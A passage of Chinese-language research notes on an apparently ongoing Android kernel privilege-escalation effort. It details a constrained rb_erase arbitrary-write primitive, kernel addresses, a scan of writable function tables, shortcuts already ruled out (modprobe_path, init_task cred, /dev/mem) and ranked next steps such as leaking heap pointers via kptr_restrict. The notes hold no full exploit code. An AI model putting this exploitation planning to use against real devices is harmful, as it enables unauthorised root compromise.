修好之后 `wpg2`（lock 指回页内 + oracle + 毒字）表现为**既不 fault 也不写**——即走链是从 `rb_erase` 的**双孩子分支**出去的，页里是别人的指针。结论：**回收页路线不仅无效，而且有害**（它会写无关的 .data），停止投入。

## A3 被证明的一条硬限制：这个原语永远无法安装代码指针

`rb_erase` 的单孩子分支产生两处写：`*(W) = V` 与 `*(V) = W−4`。第二处把 `V` 当地址解引用，所以 **V 必须指向可写内存**；而 `V` 正是写进 `W` 的值。于是：

> 该原语能存储的值只有两类：**0**（`tree_r=0` 走"无孩子"分支）或**一个可写内核地址**。

再叠加 `CONFIG_STRICT_KERNEL_RWX=y` 与 `CONFIG_STRICT_MODULE_RWX=y`（模块 `.text` 加载后也是只读），**代码地址永远无法被写入任何位置**。

这条限制的直接后果：**假 `file_operations` 不能靠"写"拼出来**——表里至少要有一个函数指针，而函数指针指向 `.text`。它只能来自"内容完全由我们 spray、且地址已知"的内存页。

为确认没有漏网之鱼，做了离线穷举（`exploit/tools/fopsscan.py`）：以链接器自身的段符号界定可写区（`_sdata=0xc1a00000`、`_edata/__bss_start=0xc1b1d080`、`__bss_stop=0xc1d5a734`；注意 **kallsyms 的类型字符不可信**，`__start_rodata` 自己就被标成 `d`），再用"slot+0x04 必须是已知的 llseek 实现"过滤掉一切函数指针数组。结果：可写区里 31 张表，**全是 `struct proto` / `proto_ops` / `ion heap_ops` / `regmap_bus` / `pernet_operations`，没有一张是 `file_operations`**：

```
raw_prot @ c1af5e34          +0x28 = raw_getsockopt
msm_system_heap_ops @ c1aa873c
ipv4_mib_ops @ c1af6b10      +0x28 = igmp_net_init
af_inet_ops @ c1af6af0       +0x08 = inet_init_net
clk_alpha_pll_regmap_ops @ c1a569e4
```

把 `misc->fops` 指向这些表会以错误的参数布局调用内核函数（r0=file 被当成 `struct sock *`/`ion_heap *`/`net *`），几乎必然崩溃且不产生任何能力 ⇒ **路线 (a) 关闭**。

## A4 其它已排除的捷径（都做过实测，别再试）

| 想法 | 结论 |
|---|---|
| `/proc/self/pagemap` 取物理帧 → 用直接映射别名当可控页 | ✗ 返回 `present=1 pfn=0`，5.4 起 PFN 需要 `CAP_SYS_ADMIN` |
| 把 `misc->fops` 指向 `memory_fops` 走 `/dev/mem` | ✗ `# CONFIG_DEVMEM is not set`；且 dump Image 里 `memory_fops` 的初始化值确认 `+0x08 read=0`、`+0x0c write=0`，只有 `+0x38 open=memory_open` |
| 用 `modprobe_path` / `core_pattern` 字符串劫持 | ✗ 需要写入 ASCII 字节，而可写的值只能是 0 或可写地址（见 A3） |
| 写 `init_task.cred = 假 cred` 让 init 的子进程提权 | ✗ 我们的 shell 是 adbd 的子进程，不继承 init 的 cred；且 `cap_*` 需要 `0xFFFFFFFF` 这种非可写地址值 |
| 借 `ashmem_fops`/`kgsl_fops` 等现成表做类型混淆 | ✗ 它们都在 `.rodata`（`__start_rodata=c0fb0000..__end_rodata=c1825000`），不能作为写入值 |

## A5 当前状态与剩余可行方向

**设备仍然没有 root（`id -u` = 2000，SELinux Enforcing，Bootloader 全程未触碰）。** 已经拿到的能力是：**每次开机 64 次、每次约 10 µs 的"任意可写地址 ← 0 或任意可写地址"写**，以及一条完整可复现的触发链（幽灵 waiter + `clock_adjtime(405)` + util-clamp punch）。

缺的只有一件：**一块"内容可控 + 地址已知"的内核页**。可行的攻法有三类，按性价比排序：

1. **给回收本身加验证**：不再依赖 KernelSnitch 的"命中即真"，而是让 spray 之后**由内核替我们确认页内容**——例如把 `waiter->lock` 指向候选页、用 `tree_r` 做一次"只写我们自己 scratch"的幂等写，再通过 `optmem_max` 之外的第二个可读 .data 变量做交叉确认；或对多个候选页各发一发（现在每发只 10 µs、一次开机可跑几十发，成本已大幅下降）。
2. **换一条泄露链**：一次零写把 `kptr_restrict=0`，从 `/proc/net/tcp` 的 `%pK` 拿到真实 `struct sock` 堆地址；堆地址一旦已知，`struct sock` 内部就有内核自己写入的**函数指针**（`sk_data_ready`/`sk_write_space`/`sk_timer.function`），可用作"跳板位于可写内存"的落点，配合 `fops = &sock->callback − 0x28` 的偏移复用。
3. **换漏洞**：本机的厂商模块（`bcmdhd` 1.8 MB、`rmnet_core`、kgsl/adreno）与 `ion` 是更大的攻击面；若目标是"临时 root"，一条自带读泄露的漏洞（例如 kgsl 的 GPU 命令流类问题）会比继续推 GhostLock 的最后一公里更省事。

方法论上，今天最重要的收获是把"能不能写"和"能不能读"这两件事彻底分开了：**GhostLock 在这台机器上给了可靠的写，但没有给任何读；而没有读，就没有可控内容的页；没有可控内容的页，写就够不到代码。** 这条推理链本身，比再多打十发 fire 更有价值。
